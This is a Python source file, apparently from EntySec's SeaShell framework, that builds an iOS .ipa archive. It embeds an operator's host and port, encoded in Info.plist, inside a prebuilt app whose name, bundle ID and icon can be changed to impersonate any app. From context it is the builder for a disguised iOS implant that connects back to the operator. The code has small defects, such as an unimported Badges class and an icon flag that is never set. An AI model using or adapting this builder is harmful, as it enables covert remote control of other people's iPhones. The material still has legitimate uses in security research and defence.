"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib

from PIL import Image

from pex.string import String
from typing import Optional


class IPA(object):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation of iOS Application Archive generator.
    """

    def __init__(self, host: str, port: int) -> None:
        """ Initialize device generator.

        :param str host: host
        :param int port: port
        :return None: None
        """

        super().__init__()

        self.data_path = f'{os.path.dirname(os.path.dirname(__file__))}/data/'

        self.badges = Badges()

        self.host = host
        self.port = port

        self.icon = None

        self.hash = String().base64_string(
            f'{host}:{str(port)}', decode=True)

        self.app_name = 'Mussel'
        self.bundle_id = 'com.entysec.mussel'
        self.binary_name = 'main'

    def set_name(self, name: str, bundle_id: str) -> None:
        """ Set application name.

        :param str name: name of application
        :param str bundle_id: bundle id (e.g. com.entysec.dummy)
        :return None: None
        """

        self.app_name = name.lower().title()
        self.bundle_id = bundle_id

    def set_icon(self, icon: str) -> None:
        """ Set application icon.

        :param str icon: icon path
        :return None: None
        """

        image = Image.open(icon)
        app = self.data_path + 'Mussel.app/'

        image.resize((29, 29), Image.ANTIALIAS).save(
            app + 'AppIcon29x29.png', 'PNG', quality=100)
        image.resize((29 * 2, 29 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon29x29@2x.png', 'PNG', quality=100)
        image.resize((29 * 3, 29 * 3), Image.ANTIALIAS).save(
            app + 'AppIcon29x29@3x.png', 'PNG', quality=100)

        image.resize((40, 40), Image.ANTIALIAS).save(
            app + 'AppIcon40x40.png', 'PNG', quality=100)
        image.resize((40 * 2, 40 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon40x40@2x.png', 'PNG', quality=100)
        image.resize((40 * 3, 40 * 3), Image.ANTIALIAS).save(
            app + 'AppIcon40x40@3x.png', 'PNG', quality=100)

        image.resize((50, 50), Image.ANTIALIAS).save(
            app + 'AppIcon50x50.png', 'PNG', quality=100)
        image.resize((50 * 2, 50 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon50x50@2x.png', 'PNG', quality=100)

        image.resize((57, 57), Image.ANTIALIAS).save(
            app + 'AppIcon57x57.png', 'PNG', quality=100)
        image.resize((57 * 2, 57 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon57x57@2x.png', 'PNG', quality=100)
        image.resize((57 * 3, 57 * 3), Image.ANTIALIAS).save(
            app + 'AppIcon57x57@3x.png', 'PNG', quality=100)

        image.resize((60, 60), Image.ANTIALIAS).save(
            app + 'AppIcon60x60.png', 'PNG', quality=100)
        image.resize((60 * 2, 60 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon60x60@2x.png', 'PNG', quality=100)
        image.resize((60 * 3, 60 * 3), Image.ANTIALIAS).save(
            app + 'AppIcon60x60@3x.png', 'PNG', quality=100)

        image.resize((72, 72), Image.ANTIALIAS).save(
            app + 'AppIcon72x72.png', 'PNG', quality=100)
        image.resize((72 * 2, 72 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon72x72@2x.png', 'PNG', quality=100)

        image.resize((76, 76), Image.ANTIALIAS).save(
            app + 'AppIcon76x76.png', 'PNG', quality=100)
        image.resize((76 * 2, 76 * 2), Image.ANTIALIAS).save(
            app + 'AppIcon76x76@2x.png', 'PNG', quality=100)

    def generate(self, path: str) -> None:
        """ Generate IPA.

        :param str path: path to save ipa
        :return None: None
        """

        self.craft_plist()
        self.build_ipa(path)

    def build_ipa(self, path: str) -> None:
        """ Build IPA.

        :param str path: path to save ipa
        :return None: None
        """

        if not os.path.isdir(path):
            path = os.path.split(path)[0]

        payload = path + '/Payload/'
        archive = path + '/' + self.app_name + '.ipa'

        os.mkdir(payload)
        shutil.copytree(self.data_path + 'Mussel.app', payload + 'Mussel.app')
        shutil.make_archive(archive, 'zip', payload)
        shutil.move(archive + '.zip', archive)
        shutil.rmtree(payload)

    def craft_plist(self) -> None:
        """ Craft plist file.

        :return None: None
        """

        plist_path = (
                self.data_path +
                'Mussel.app/Info.plist'
        )

        plist = {
            'CFBundleBase64Hash': self.hash,
            'CFBundleDevelopmentRegion': 'en',
            'CFBundleDisplayName': self.app_name,
            'CFBundleExecutable': self.binary_name,
            'CFBundleIdentifier': self.bundle_id,
            'CFBundleInfoDictionaryVersion': '6.0',
            'CFBundleName': self.app_name,
            'CFBundlePackageType': 'APPL',
            'CFBundleShortVersionString': '1.0.0',
            'CFBundleSignature': '????',
            'CFBundleVersion': '1',
            'LSRequiresIPhoneOS': True,
            'UISupportedInterfaceOrientations': [
                'UIInterfaceOrientationPortrait',
                'UIInterfaceOrientationPortraitUpsideDown',
                'UIInterfaceOrientationLandscapeLeft',
                'UIInterfaceOrientationLandscapeRight'
            ]
        }

        if self.icon:
            plist.update({
                'CFBundleIcons': {
                    'CFBundlePrimaryIcon': {
                        'CFBundleIconFiles': [
                            'AppIcon29x29',
                            'AppIcon40x40',
                            'AppIcon57x57',
                            'AppIcon60x60',
                        ],
                        'UIPrerenderedIcon': True
                    }
                },
                'CFBundleIcons~ipad': {
                    'CFBundlePrimaryIcon': {
                        'CFBundleIconFiles': [
                            'AppIcon29x29',
                            'AppIcon40x40',
                            'AppIcon57x57',
                            'AppIcon60x60',
                            'AppIcon50x50',
                            'AppIcon72x72',
                            'AppIcon76x76',
                        ],
                        'UIPrerenderedIcon': True
                    }
                }
            })

        with open(plist_path, 'wb') as f:
            plistlib.dump(plist, f)
